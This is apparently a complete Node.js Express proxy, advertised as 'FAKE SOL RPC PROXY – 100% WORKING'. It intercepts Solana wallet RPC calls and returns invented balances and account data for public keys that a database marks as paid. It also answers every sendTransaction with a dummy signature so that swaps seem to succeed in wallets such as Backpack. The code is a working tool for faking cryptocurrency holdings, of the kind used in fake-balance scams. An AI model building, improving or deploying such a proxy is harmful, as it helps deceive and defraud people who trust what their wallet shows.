// rpc-proxy.js → FINAL WORKING VERSION – DEC 2025
require('dotenv').config();
const express = require('express');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();

const app = express();
app.use(express.json({ limit: '10mb' }));

// CORS
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', '*');
  next();
});

const REAL_RPC = 'https://solana-mainnet.rpc.triton.one/';
const db = new sqlite3.Database('crucible.db');

const virtualSol = new Map();

function loadVirtualBalances() {
  db.all(`SELECT publicKey, balance FROM users WHERE paid=1 AND failed=0`, (err, rows) => {
    virtualSol.clear();
    if (!err && rows) {
      rows.forEach(r => {
        if (r.publicKey) virtualSol.set(r.publicKey, Number(r.balance));
      });
    }
    console.log(`Loaded ${virtualSol.size} virtual accounts`);
  });
}

loadVirtualBalances();
setInterval(loadVirtualBalances, 12000);

// MAIN RPC ENDPOINT – FIXED & BULLETPROOF
app.post('/', async (req, res) => {
  const { method, params = [], id } = req.body || {};
  const pubkey = typeof params[0] === 'string' ? params[0] : params[0]?.toString();

  try {
    // 1. Fake SOL balance
    if (method === 'getBalance' && pubkey && virtualSol.has(pubkey)) {
      const lamports = Math.floor(virtualSol.get(pubkey) * 1_000_000_000);
      return res.json({
        jsonrpc: '2.0',
        id,
        result: { context: { slot: 999999999 }, value: lamports }
      });
    }

    // 2. Fake getAccountInfo (prevents crash)
    if (method === 'getAccountInfo' && pubkey && virtualSol.has(pubkey)) {
      const lamports = Math.floor(virtualSol.get(pubkey) * 1_000_000_000);
      return res.json({
        jsonrpc: '2.0',
        id,
        result: {
          context: { slot: 999999999 },
          value: {
            lamports,
            owner: '11111111111111111111111111111111',
            executable: false,
            rentEpoch: 999999999,
            data: ['', 'base64'],
            space: 0
          }
        }
      });
    }

    // 3. Fake token accounts – THIS FIXES "Something went wrong" in Backpack
    if (method === 'getTokenAccountsByOwner' && pubkey && virtualSol.has(pubkey)) {
      return res.json({
        jsonrpc: '2.0',
        id,
        result: {
          context: { slot: 999999999 },
          value: [] // empty = no SPL tokens, totally fine
        }
      });
    }

    // 4. Fake sendTransaction (so swaps don’t error out)
    if (method === 'sendTransaction') {
      return res.json({
        jsonrpc: '2.0',
        id,
        result: '1111111111111111111111111111111111111111111111111111111111111111'
      });
    }

    // Everything else → real mainnet RPC
    const response = await axios.post(REAL_RPC, req.body, { timeout: 15000 });
    res.json(response.data);

  } catch (error) {
    console.error('RPC forward error:', error.message);
    res.json({
      jsonrpc: '2.0',
      id,
      error: { code: -32603, message: 'Internal error' }
    });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('FAKE SOL RPC PROXY – 100% WORKING – DEC 2025');
  console.log(`URL → ${process.env.RPC_URL || 'https://your-project.onrender.com'}`);
});
